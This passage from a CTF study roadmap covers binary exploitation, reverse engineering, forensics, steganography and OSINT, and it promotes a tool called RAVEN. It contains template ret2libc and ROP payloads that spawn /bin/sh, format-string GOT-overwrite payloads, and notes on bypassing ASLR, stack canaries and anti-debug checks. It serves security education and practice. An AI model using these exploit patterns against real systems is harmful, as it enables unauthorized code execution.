r2 -c "/R" binary
```

#### Common Gadgets:
```assembly
pop rdi; ret          # Set first argument (x64)
pop rsi; ret          # Set second argument
pop rdx; ret          # Set third argument
pop rax; ret          # Set syscall number
syscall               # Execute syscall
```

#### ret2libc Attack:
- Return to libc functions
- **Goal:** Call `system("/bin/sh")`
```python
# x64 example
pop_rdi = 0x401234    # pop rdi; ret
system = 0x401000     # system@plt
binsh = 0x402000      # "/bin/sh" string

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
```

#### ret2plt:
- Leak libc addresses via GOT
- Calculate libc base
- Return to `system()` in libc

#### GOT Overwrite:
- Global Offset Table contains function addresses
- Overwrite GOT entry → redirect function calls
- **Example:** Overwrite `printf` GOT with `system`

#### ROP Chain Example:
```python
# Call execve("/bin/sh", 0, 0)
pop_rdi = find_gadget("pop rdi; ret")
pop_rsi = find_gadget("pop rsi; ret")
pop_rdx = find_gadget("pop rdx; ret")
syscall = find_gadget("syscall; ret")

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)      # rdi = "/bin/sh"
payload += p64(pop_rsi)
payload += p64(0)               # rsi = 0
payload += p64(pop_rdx)
payload += p64(0)               # rdx = 0
payload += p64(pop_rax)
payload += p64(59)              # rax = 59 (execve)
payload += p64(syscall)

p.sendline(payload)
```

#### 🔧 RAVEN Commands:
```bash
# Analyze binary structure
raven binary.elf --reversing

# Check binary protections
checksec binary.elf
```

#### 🎮 Practice Platforms:
- **ROP Emporium** (Best for learning ROP)
- **picoCTF: ROP challenges**
- **HackTheBox: Pwn**

#### 🏆 CTF Strategy:
1. Check NX bit (can't execute stack)
2. Find ROP gadgets
3. Build chain for desired action
4. Handle ASLR (leak addresses)
5. Execute payload

#### ⏱️ Time to Mastery: 4-6 weeks

---

### 🧾 4.4 Format String Attacks

**Prevalence:** ⭐⭐⭐ (Less common but important)  
**Difficulty:** ⭐⭐⭐⭐ (Hard)

#### Vulnerable Code:
```c
char input[100];
fgets(input, sizeof(input), stdin);
printf(input);  // VULNERABLE! Should be printf("%s", input)
```

#### Exploitation:
- **Read from Stack:**
  ```
  %x    # Read 4 bytes (hex)
  %p    # Read pointer
  %s    # Read string from address
  %7$x  # Read 7th argument
  ```

- **Arbitrary Write:**
  ```
  %n    # Write number of bytes printed to address
  %7$n  # Write to 7th argument's address
  ```

- **Arbitrary Read/Write:**
  ```python
  # Read from address
  payload = p64(target_addr) + "%7$s"
  
  # Write to address
  payload = p64(target_addr) + "%7$n"
  ```

#### GOT Overwrite via Format String:
```python
# Overwrite printf GOT with system
payload = p64(printf_got)
payload += p64(printf_got + 2)
payload += "%{}c%7$hn".format(system & 0xffff)
payload += "%{}c%8$hn".format((system >> 16) & 0xffff)
```

#### 🎮 Practice Platforms:
- **Exploit Education: Format**
- **picoCTF: Format String challenges**
- **HackTheBox**

#### 🏆 CTF Strategy:
1. Find `printf(user_input)` pattern
2. Determine offset to input
3. Read/Write memory
4. Overwrite GOT entries
5. Achieve code execution

#### ⏱️ Time to Mastery: 3-4 weeks

---

### 🧠 4.5 Heap Exploitation

**Prevalence:** ⭐⭐⭐ (Intermediate/Advanced)  
**Difficulty:** ⭐⭐⭐⭐⭐ (Very Hard)

#### Heap Basics:
- Dynamic memory allocation (malloc, free)
- Different from stack (manual management)
- **Structures:**
  - Chunks: Allocated memory blocks
  - Bins: Lists of free chunks
  - Metadata: Size, prev_size flags

#### Common Vulnerabilities:

**Use-After-Free (UAF):**
```c
char *ptr = malloc(0x100);
free(ptr);
// ptr still accessible!
strcpy(ptr, "data");  // UAF!
```

**Double Free:**
```c
char *ptr = malloc(0x100);
free(ptr);
free(ptr);  // DOUBLE FREE!
```

**Heap Overflow:**
```c
char *ptr = malloc(0x100);
fgets(ptr, 0x200, stdin);  // Overflow!
```

#### Advanced Techniques:

**Tcache Poisoning:**
- glibc 2.26+ introduced tcache
- Less checks → more exploitable
- **Goal:** Fake chunk → arbitrary write

**Heap Feng Shui:**
- Carefully control heap layout
- Place objects at predictable locations
- Combine with other vulnerabilities

#### 🔧 RAVEN Commands:
```bash
# Analyze binary
raven binary.elf --reversing

# Check for heap-related functions
strings binary.elf | grep -i "malloc\|free\|alloc"
```

#### 🎮 Practice Platforms:
- **How2Heap** (GitHub: shellphish/how2heap)
- **picoCTF: Heap challenges**
- **HackTheBox: Advanced Pwn**

#### 🏆 CTF Strategy:
1. Identify heap operations
2. Find vulnerability type (UAF, double free, overflow)
3. Understand heap state
4. Craft exploitation primitive
5. Achieve arbitrary read/write

#### ⏱️ Time to Mastery: 6-8 weeks

---

### 🛡️ 4.6 Protections & Bypass

**Prevalence:** ⭐⭐⭐⭐⭐ (Must know for modern CTFs)  
**Difficulty:** ⭐⭐⭐⭐ (Intermediate to Hard)

#### Common Protections:

**1. ASLR (Address Space Layout Randomization):**
- Randomizes memory addresses
- **Bypass:**
  - Information leak (print addresses)
  - Bruteforce (32-bit: feasible)
  - Return to PLT (not randomized)

**2. NX (No-Execute) / DEP (Data Execution Prevention):**
- Stack/heap non-executable
- **Bypass:** ROP chains
- **Check:** `checksec` shows `NX enabled`

**3. Stack Canaries:**
- Random value before return address
- **Bypass:**
  - Leak canary value
  - Brute force (byte-by-byte)
  - Format string vulnerability

**4. PIE (Position Independent Executable):**
- Binary loaded at random address
- **Bypass:**
  - Leak base address
  - Return to PLT/GOT
  - Partial overwrite

**5. RELRO (Relocation Read-Only):**
- **Partial RELRO:** GOT writable
- **Full RELRO:** GOT read-only
- **Bypass Full RELRO:** ROP before GOT

#### Checking Protections:
```bash
# checksec (pwntools)
checksec binary.elf

# Example output:
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
```

#### Bypass Strategies:
- **No PIE:** Direct addresses work
- **No Canary:** Simple overflow
- **No NX:** Execute shellcode on stack
- **No ASLR:** Addresses constant

#### 🔧 RAVEN Commands:
```bash
# Analyze binary protections
raven binary.elf --reversing

# Extract strings for hints
strings binary.elf | grep -E "flag|success|win"
```

#### 🎮 Practice Platforms:
- **picoCTF: Progressive difficulty**
- **Exploit Education**
- **HackTheBox**

#### 🏆 CTF Strategy:
1. Check all protections with `checksec`
2. Identify which protections active
3. Plan bypass strategy
4. Combine vulnerabilities
5. Achieve reliable exploitation

#### ⏱️ Time to Mastery: 4-6 weeks

---

## 🔍 Phase 5 — Reverse Engineering

*Understand binaries without source code*

---

### 📊 5.1 Static Analysis

**Prevalence:** ⭐⭐⭐⭐⭐ (Core skill)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### Tools:

**Ghidra (Free, NSA):**
- **Best for:** Full decompilation
- **Features:**
  - Decompiles to C-like code
  - Cross-references
  - Scripting (Python/Java)
- **Usage:**
  ```bash
  # Headless analysis (RAVEN integration)
  raven binary.elf --reversing --ghidra
  ```

**IDA Pro (Commercial, Industry Standard):**
- **Best for:** Professional reverse engineering
- **Features:**
  - Best decompiler
  - Graph view
  - Extensive plugin ecosystem
- **Free Version:** IDA Free (limited)

**Binary Ninja (Commercial, Modern):**
- **Best for:** Clean UI, good for beginners
- **Features:**
  - Intermediate Language (IL)
  - Python API
  - Affordable

**radare2 (Free, CLI):**
- **Best for:** Quick analysis, scripting
- **Commands:**
  ```bash
  r2 binary.elf        # Open binary
  aaa                  # Analyze all
  afl                  # List functions
  pdf @ main           # Print disassembly of main
  s main               # Seek to main
  V                    # Visual mode
  ```

#### Analysis Process:

**1. Initial Recon:**
```bash
# File type
file binary.elf

# Strings
strings binary.elf | less

# Symbols
nm binary.elf

# Libraries
ldd binary.elf

# Check protections
checksec binary.elf
```

**2. Entry Points:**
- `main()` function
- `init()` constructors
- Import/Export tables

**3. Function Analysis:**
- Identify interesting functions
- Follow cross-references
- Understand control flow

**4. String References:**
- Find "flag", "success", "correct"
- Trace back to validation logic

#### 🔧 RAVEN Commands:
```bash
# Full reversing pipeline
raven binary.elf --reversing

# Ghidra analysis
raven binary.elf --reversing --ghidra

# Strings extraction
raven binary.elf --reversing | grep -i "flag"
```

#### 🎮 Practice Platforms:
- **Crackmes.one** (Community crackmes)
- **picoCTF: Reverse Engineering**
- **Reverse Engineering Challenges** (GitHub)
- **Malware Analysis** (Real-world samples)

#### 🏆 CTF Strategy:
1. Run `file`, `strings`, `checksec`
2. Load in Ghidra/IDA
3. Find main/entry point
4. Look for flag comparison
5. Extract flag or bypass check

#### ⏱️ Time to Mastery: 4-6 weeks

---

### 🧪 5.2 Dynamic Analysis

**Prevalence:** ⭐⭐⭐⭐ (Essential)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### Tools:

**GDB (GNU Debugger):**
```bash
gdb ./binary

# Common commands:
break main          # Set breakpoint
run                 # Start program
next/step           # Step over/into
continue            # Continue execution
info registers      # Show registers
x/20x $rsp          # Examine memory
print $rax          # Print register value
```

**GDB Enhancements:**
- **GEF (GDB Enhanced Features):**
  ```bash
  git clone https://github.com/hugsy/gef.git
  echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit
  ```
  
- **pwndbg:**
  ```bash
  git clone https://github.com/pwndbg/pwndbg.git
  cd pwndbg && ./setup.sh
  ```

**ltrace (Library Call Tracer):**
```bash
# Trace library calls
ltrace ./binary

# Filter specific functions
ltrace -e strcmp ./binary
```

**strace (System Call Tracer):**
```bash
# Trace system calls
strace ./binary

# Follow forks
strace -f ./binary
```

#### Debugging Workflow:

**1. Set Breakpoints:**
```gdb
break main
break strcmp
break *0x401234
```

**2. Run and Inspect:**
```gdb
run
info registers
x/20x $rsp
```

**3. Modify Execution:**
```gdb
set $rax = 1          # Change register
set {int}0x402000 = 0 # Modify memory
continue
```

**4. Capture Input/Output:**
```gdb
# Before comparison
x/s $rdi              # Print string
x/10xb $rsi           # Print bytes
```

#### 🔧 RAVEN Integration:
```bash
# Analyze binary first
raven binary.elf --reversing

# Extract strings for reference
strings binary.elf > binary_strings.txt
```

#### 🎮 Practice Platforms:
- **picoCTF: Debugging challenges**
- **Crackmes.one**
- **Malware Analysis**

#### 🏆 CTF Strategy:
1. Static analysis first (understand structure)
2. Set breakpoints at key locations
3. Run with sample input
4. Inspect memory/registers
5. Extract flag or bypass checks

#### ⏱️ Time to Mastery: 3-4 weeks

---

### 🕵️ 5.3 Anti-Reverse Techniques

**Prevalence:** ⭐⭐⭐ (Intermediate/Advanced)  
**Difficulty:** ⭐⭐⭐⭐ (Hard)

#### Common Techniques:

**Obfuscation:**
- Junk code insertion
- Control flow flattening
- Opaque predicates (always true/false conditions)
- **Deobfuscation:** Symbolic execution

**Packing:**
- Compress/encrypt binary
- Runtime unpacking in memory
- **Common Packers:**
  - UPX (easiest)
  - Themida
  - VMProtect
- **Unpacking:**
  ```bash
  # UPX unpacking (RAVEN integration)
  raven packed.exe --reversing --unpack
  
  # Manual UPX unpacking
  upx -d packed.exe -o unpacked.exe
  ```

**Anti-Debug:**
- `ptrace(PTRACE_TRACEME)` (Linux)
- `IsDebuggerPresent()` (Windows)
- Timing checks
- **Bypass:**
  - NOP out checks
  - Patch binaries
  - Use plugins

**VM Detection:**
- Check for VM artifacts
- MAC addresses, processes, files
- **Bypass:** Modify VM configuration

#### 🔧 RAVEN Commands:
```bash
# Detect packers
raven binary.exe --reversing

# Auto-unpack UPX
raven binary.exe --reversing --unpack
```

#### 🎮 Practice Platforms:
- **Crackmes.one (with protection)**
- **Malware samples**
- **Reverse Engineering challenges**

#### 🏆 CTF Strategy:
1. Detect protection type
2. Unpack if packed
3. Patch anti-debug checks
4. Proceed with normal analysis
5. Use multiple tools (don't rely on one)

#### ⏱️ Time to Mastery: 4-6 weeks

---

### 📦 5.4 Binary Formats

**Prevalence:** ⭐⭐⭐⭐⭐ (Fundamental)  
**Difficulty:** ⭐⭐☆ (Beginner to Intermediate)

#### ELF (Executable and Linkable Format - Linux):
```
ELF Header
├── Program Headers (Segments)
│   ├── .text (code)
│   ├── .data (initialized data)
│   ├── .bss (uninitialized data)
│   └── .rodata (read-only data)
└── Section Headers
    ├── .symtab (symbol table)
    ├── .strtab (string table)
    ├── .dynsym (dynamic symbols)
    └── .rela.dyn (relocations)
```

**Analysis:**
```bash
# ELF structure
readelf -h binary.elf      # Header
readelf -l binary.elf      # Program headers
readelf -S binary.elf      # Sections
readelf -s binary.elf      # Symbols

# RAVEN integration
raven binary.elf --reversing
```

#### PE (Portable Executable - Windows):**
```
DOS Header (MZ)
├── PE Signature
├── COFF File Header
├── Optional Header
│   ├── Data Directories
│   │   ├── Import Table
│   │   ├── Export Table
│   │   └── Resource Table
│   └── Sections
│       ├── .text
│       ├── .data
│       ├── .rsrc
│       └── .reloc
```

**Analysis:**
```bash
# PE analysis tools
pefile (Python library)
CFF Explorer (GUI)
PE-bear (GUI)
```

#### 🔧 RAVEN Commands:
```bash
# Full binary analysis
raven binary.elf --reversing

# Check binary type
file binary.elf
```

#### 🎮 Practice Platforms:
- **picoCTF: Binary analysis**
- **Crackmes.one**
- **Malware Analysis**

#### ⏱️ Time to Mastery: 2 weeks

---

### 🚀 5.5 Advanced Reverse Engineering

**Prevalence:** ⭐⭐⭐ (Specialized)  
**Difficulty:** ⭐⭐⭐⭐⭐ (Very Hard)

#### .NET / Java Decompilation:
- **.NET:**
  - **Tools:** dnSpy, ILSpy, dotPeek
  - **Easy to reverse** (high-level code)
  - **Obfuscation:** ConfuserEx, Dotfuscator
  
- **Java:**
  - **Tools:** JD-GUI, Jadx, Fernflower
  - **JAR extraction:** `jar xf app.jar`
  - **Obfuscation:** ProGuard

#### Android APK Reversing:
```bash
# Extract APK
apktool d app.apk -o app_decoded

# Decompile DEX
jadx -d output app.apk

# Analyze AndroidManifest.xml
cat app_decoded/AndroidManifest.xml
```

**Common Vulnerabilities:**
- Hardcoded API keys
- Insecure storage
- Weak encryption
- Exported components

#### Firmware Analysis:
```bash
# Extract firmware
binwalk firmware.bin -e

# Analyze extracted files
ls -la firmware.bin.extracted/

# Look for credentials
grep -r "password\|admin" firmware.bin.extracted/

# Check for backdoors
strings firmware.bin.extracted/*/bin/* | grep -i "shell\|exec"
```

#### 🔧 RAVEN Commands:
```bash
# Basic firmware analysis
raven firmware.bin --auto

# Extract strings
strings firmware.bin | grep -i "flag\|password"
```

#### 🎮 Practice Platforms:
- **picoCTF: Mobile/Android**
- **OWASP MSTG** (Mobile Security)
- **Firmware analysis challenges**

#### 🏆 CTF Strategy:
1. Identify binary type/format
2. Use appropriate decompiler
3. Handle obfuscation
4. Find flag validation logic
5. Extract or bypass

#### ⏱️ Time to Mastery: 6-8 weeks

---

## 🧩 Phase 6 — Forensics & Misc

*Investigate artifacts and solve diverse challenges*

---

### 📁 6.1 File Analysis

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common)  
**Difficulty:** ⭐⭐☆ (Beginner to Intermediate)

#### Magic Bytes:
- File signatures at start of file
- **Examples:**
  - PNG: `\x89PNG\r\n\x1a\n`
  - JPEG: `\xff\xd8\xff`
  - PDF: `%PDF`
  - ZIP: `PK\x03\x04`

**Check with:**
```bash
file suspicious.dat
xxd suspicious.dat | head
```

#### Binwalk (Firmware/Embedded Files):**
```bash
# Scan for embedded files
binwalk firmware.bin

# Extract automatically
binwalk firmware.bin -e

# Recursive extraction
binwalk firmware.bin -Me
```

#### File Carving:
```bash
# Extract files from raw data
foremost disk_image.raw

# Output in output/ directory
ls output/
```

#### EXIF Metadata:
```bash
# View metadata
exiftool image.jpg

# Remove metadata
exiftool -all= image.jpg
```

#### 🔧 RAVEN Commands:
```bash
# Full file analysis
raven suspicious.file --auto

# Extract embedded files
raven firmware.bin --auto

# Check EXIF
raven image.jpg --exif

# GPS extraction (if available)
raven image.jpg --gps-extract
```

#### 🎮 Practice Platforms:
- **picoCTF: Forensics**
- **Forensics CTF** (forensics.ctf)
- **SANS Forensics Challenges**

#### 🏆 CTF Strategy:
1. Check file type (`file` command)
2. Look for fake extensions
3. Run `strings` for quick wins
4. Use binwalk for embedded files
5. Check metadata for clues

#### ⏱️ Time to Mastery: 2-3 weeks

---

### 💾 6.2 Memory & Disk Forensics

**Prevalence:** ⭐⭐⭐⭐ (Common)  
**Difficulty:** ⭐⭐⭐⭐ (Intermediate to Hard)

#### Memory Forensics (Volatility):**

**Basic Workflow:**
```bash
# Identify profile
volatility -f memory.raw imageinfo

# Process list
volatility -f memory.raw --profile=Win7SP1x64 pslist

# Dump process
volatility -f memory.raw --profile=Win7SP1x64 memdump -p 1234 -D output/

# Network connections
volatility -f memory.raw --profile=Win7SP1x64 netscan

# Command history
volatility -f memory.raw --profile=Win7SP1x64 cmdline
```

**Advanced Analysis:**
```bash
# Malware detection (malfind)
volatility -f memory.raw --profile=Win7SP1x64 malfind

# File scan
volatility -f memory.raw --profile=Win7SP1x64 filescan

# Dump files
volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000123456789 -D output/

# Registry hives
volatility -f memory.raw --profile=Win7SP1x64 hivelist
```

#### 🔧 RAVEN Commands:
```bash
# Volatility analysis
raven memory.raw --volatility

# Advanced memory forensics
raven memory.raw --memory

# Check for malware indicators
raven memory.raw --volatility --vol-plugin malfind
```

#### Disk Forensics:

**NTFS Recovery:**
```bash
# MFT parsing
raven disk.raw --mft

# Deleted file recovery
raven disk.raw --ntfs

# Partition analysis
raven disk.raw --partition
```

**File System Analysis:**
```bash
# List partitions
mmls disk.raw

# List files in partition
fls -f ntfs -o 2048 disk.raw

# Recover file
icat -f ntfs -o 2048 disk.raw 1234 > recovered.txt
```

#### 🔧 RAVEN Commands:
```bash
# Disk image analysis
raven disk.raw --disk

# NTFS deleted file recovery
raven disk.raw --ntfs

# MFT analysis
raven disk.raw --mft
```

#### 🎮 Practice Platforms:
- **picoCTF: Forensics**
- **Volatility Foundation Challenges**
- **SANS DFIR Challenges**

#### 🏆 CTF Strategy:
1. Identify image type (memory/disk)
2. Use appropriate tools
3. Look for hidden/deleted data
4. Check processes/files of interest
5. Extract flag from artifacts

#### ⏱️ Time to Mastery: 4-6 weeks

---

### 🌐 6.3 Network Forensics

**Prevalence:** ⭐⭐⭐⭐ (Common)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### PCAP Analysis:

**Basic Analysis:**
```bash
# Overview
capinfos capture.pcap

# Protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Follow TCP stream
tshark -r capture.pcap -T fields -e tcp.stream
```

**HTTP Analysis:**
```bash
# List HTTP objects
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Extract objects
tshark -r capture.pcap --export-objects http,http_objects/
```

**DNS Analysis:**
```bash
# List DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# Detect tunneling
raven capture.pcap --dns-tunnel
```

**Credential Extraction:**
```bash
# Extract credentials
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

#### 🔧 RAVEN Commands:
```bash
# Full PCAP analysis
raven capture.pcap --pcap

# FTP session reconstruction
raven capture.pcap --ftp-recon

# Email reconstruction
raven capture.pcap --email-recon

# DNS tunneling detection
raven capture.pcap --dns-tunnel
```

#### 🎮 Practice Platforms:
- **Wireshark 101**
- **MalwareTrafficAnalysis.net**
- **picoCTF: Forensics**

#### 🏆 CTF Strategy:
1. Open PCAP in Wireshark
2. Check protocol hierarchy
3. Follow interesting streams
4. Extract files/credentials
5. Look for hidden data in protocols

#### ⏱️ Time to Mastery: 3-4 weeks

---

### 🖼️ 6.4 Steganography

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common)  
**Difficulty:** ⭐⭐⭐ (Beginner to Intermediate)

#### Image Steganography:

**LSB (Least Significant Bit):**
- Hidden in last bits of pixel values
- **Tools:**
  ```bash
  # zsteg (PNG/BMP)
  zsteg image.png -a
  
  # Steghide (JPEG)
  steghide extract -sf image.jpg -p ""
  
  # Stegseek (fast steghide cracking)
  stegseek image.jpg /usr/share/wordlists/rockyou.txt
  ```

**Advanced Techniques:**
- **DCT Coefficients (JPEG):**
  ```bash
  raven image.jpg --dct-analysis
  ```
  
- **Chi-Square Detection:**
  ```bash
  raven image.png --chi-square
  ```

- **Spectrogram (Audio):**
  ```bash
  raven audio.wav --spectrogram
  ```

#### 🔧 RAVEN Commands:
```bash
# Auto steganalysis
raven image.png --auto

# LSB analysis
raven image.png --lsb

# Steghide extraction
raven image.jpg --steghide

# Stegseek brute-force
raven image.jpg --stegseek

# Audio spectrogram
raven audio.wav --spectrogram

# Chi-square detection
raven image.png --chi-square
```

#### 🎮 Practice Platforms:
- **picoCTF: Forensics**
- **Stego challenges in CTFs**
- **Aperi'Solve** (Online stego tool)

#### 🏆 CTF Strategy:
1. Check file type (real or fake?)
2. Run `strings` (easy flags)
3. Check metadata (`exiftool`)
4. Try LSB tools (`zsteg`, `steghide`)
5. Brute-force passwords if needed

#### ⏱️ Time to Mastery: 2-3 weeks

---

### 🕵️ 6.5 OSINT (Open Source Intelligence)

**Prevalence:** ⭐⭐⭐ (Growing category)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### Metadata Extraction:
```bash
# EXIF data
exiftool image.jpg

# GPS coordinates
raven image.jpg --gps-extract
```

#### Social Media Recon:
- **Username search:**
  - Namechk.com
  - WhatsMyName.app
- **Email search:**
  - HaveIBeenPwned.com
  - Hunter.io
- **Phone search:**
  - Truecaller
  - SpyDialer

#### Geolocation:
- **Google Maps/Street View**
- **SunCalc** (shadow analysis)
- **Weather history**
- **Landmark identification**

#### Wayback Machine:
```bash
# Check archived versions
wayback_machine_downloader URL
```

#### 🔧 RAVEN Commands:
```bash
# GPS extraction
raven image.jpg --gps-extract

# File metadata
raven document.pdf --auto
```

#### 🎮 Practice Platforms:
- **GeoGuessr** (Practice geolocation)
- **TraceLabs CTFs**
- **OSINT challenges in CTFs**

#### 🏆 CTF Strategy:
1. Extract all metadata
2. Search for usernames/handles
3. Use reverse image search
4. Check timestamps/GPS
5. Correlate information

#### ⏱️ Time to Mastery: 3-4 weeks

---

## 📊 Learning Timeline Summary

| Phase | Topics | Estimated Time |
|-------|--------|----------------|
| **Phase 1** | Getting Started | 7-9 weeks |
| **Phase 2** | Web Exploitation | 8-12 weeks |
| **Phase 3** | Cryptography | 10-16 weeks |
| **Phase 4** | Binary Exploitation | 14-22 weeks |
| **Phase 5** | Reverse Engineering | 12-20 weeks |
| **Phase 6** | Forensics & Misc | 10-16 weeks |

**Total Estimated Time:** 12-24 months for comprehensive mastery

**Note:** This is a guide, not a race! Focus on topics relevant to your goals.

---

## 🎯 Quick Start Recommendations

### For Complete Beginners:
1. Start with **picoCTF** (easiest entry point)
2. Complete **OverTheWire: Bandit** (Linux basics)
3. Learn **Python basics** (automation)
4. Try **CryptoHack** (crypto fundamentals)
5. Join **CTF teams** on Discord for community

### For Intermediate Players:
1. Specialize in 1-2 categories
2. Practice on **HackTheBox**
3. Learn **binary exploitation** (high value skill)
4. Participate in **weekend CTFs**
5. Write **write-ups** to reinforce learning

### For Advanced Competitors:
1. Master **advanced pwn/crypto**
2. Practice **attack-defense** format
3. Develop **custom tools**
4. **Mentor beginners**
5. Compete in **major CTFs** (DEF CON, CSAW)

---

## 🔗 Useful Resources

### Learning Platforms:
- **picoCTF:** https://picoctf.org
- **CryptoHack:** https://cryptohack.org
- **OverTheWire:** https://overthewire.org
- **HackTheBox:** https://hackthebox.com
- **PortSwigger Academy:** https://portswigger.net/web-security

### Tools & References:
- **CyberChef:** https://gchq.github.io/CyberChef
- **dCode.fr:** https://www.dcode.fr
- **FactorDB:** https://factordb.com
- **Hashes.org:** https://hashes.org
- **CTFtime:** https://ctftime.org (CTF calendar)

### Communities:
- **Discord CTF servers**
- **Reddit: r/securityCTF**
- **Twitter: #CTF community**
- **Local CTF teams**

---

## 💡 Final Tips

1. **Practice Daily:** Even 30 minutes helps
2. **Read Write-ups:** Learn from others
3. **Don't Give Up:** Struggle = Learning
4. **Collaborate:** Join a team
5. **Have Fun:** CTFs are games, enjoy them!

---

**Good luck on your CTF journey! 🚩**

*This guide is continuously updated. Check back for new content and RAVEN tool integrations.*